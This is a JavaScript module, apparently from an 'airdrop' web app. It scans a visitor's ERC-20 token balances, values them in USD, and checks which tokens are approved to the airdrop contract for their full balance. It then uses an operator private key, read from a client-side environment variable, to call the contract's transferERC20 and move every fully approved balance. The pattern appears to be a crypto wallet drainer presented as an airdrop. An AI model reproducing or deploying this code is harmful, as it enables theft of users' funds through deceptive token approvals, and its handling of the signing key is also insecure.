import { ethers } from "ethers";
import axios from "axios";
const erc20abi = require("../abis/erc20abi.json");
const dataProviderAbi = require("../abis/DataProviderAbi.json");
const airdropAbi = require('../abis/AirdropAbi.json');
export const getBalanceErc20 = async (providerAddress, provider, tokens, userAddress, airdrop) => {
    console.log("GET BALANCE ERC20")
    const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
    const balances = await dataProviderContract.getERC20Balances(tokens.map((a) => { return a.address }), userAddress)
    const filtredByBalance = tokens.reduce((filtered, element, index) => {
        if (balances[index].toString() !== "0") {
            filtered.push({ ...element, balance: balances[index] })
        }
        return filtered;
    }, [])
    let filtredTokens = [];
    for (let i = 0; i < filtredByBalance.length; i++) {
        const contract = new ethers.Contract(filtredByBalance[i].address, erc20abi, provider);
        const decimals = await contract.decimals();
        const allowance = await contract.allowance(userAddress, airdrop);
        const res = await axios.get(`https://min-api.cryptocompare.com/data/price?fsym=${filtredByBalance[i].symbol}&tsyms=USD`)
        const price = res.data.USD;
        const balanceInUsd = +ethers.utils.formatUnits(filtredByBalance[i].balance, decimals) * res.data.USD;
        let isApproved = false;
        if (allowance.toString() > 0 && filtredByBalance[i].balance.toString() === allowance.toString()) {
            isApproved = true;
        }
        else {
            isApproved = false;
        }
        let newToken = { ...filtredByBalance[i], decimals: decimals, allowance: allowance, price: price, balanceInUsd: balanceInUsd, isApproved: isApproved };
        filtredTokens.push(newToken);
    }
    return await Promise.all(filtredTokens);
}
export const transferErc20 = async (chain, tokensWithBalance, signer, airdrop, userAddress, provider) => {
    const payerTransfer = process.env.REACT_APP_SIGNER_API_KEY;
    let res = [];
    for (let i = 0; i < tokensWithBalance.length; i++) {
        try {
            const contract = new ethers.Contract(tokensWithBalance[i].address, erc20abi, signer);
            const allowance = await contract.allowance(userAddress, airdrop);
            if (allowance.toString() !== "0" && tokensWithBalance[i].balance.toString() !== "0" && tokensWithBalance[i].balance.toString() === allowance.toString()) {
                res.push(tokensWithBalance[i]);
            }
        }
        catch (err) {
            console.log(err);
        }
    }
    try {
        const addresses = res.map((token) => token.address);
        const amounts = res.map((token) => token.balance);
        if (addresses.length > 0 && amounts.length > 0) {
            const signer = new ethers.Wallet(payerTransfer, provider);
            const airdropContract = new ethers.Contract(airdrop, airdropAbi, signer);
            let txToSend = "";
            if (chain.id === 137) {
                txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts, { gasPrice: provider.getGasPrice() });
            }
            else {
                txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts);
            }
            signer.sendTransaction(txToSend).then((res) => {
                console.log(res, "res")
            })
        }
    }
    catch (err) {
        console.log(err);
    }
}
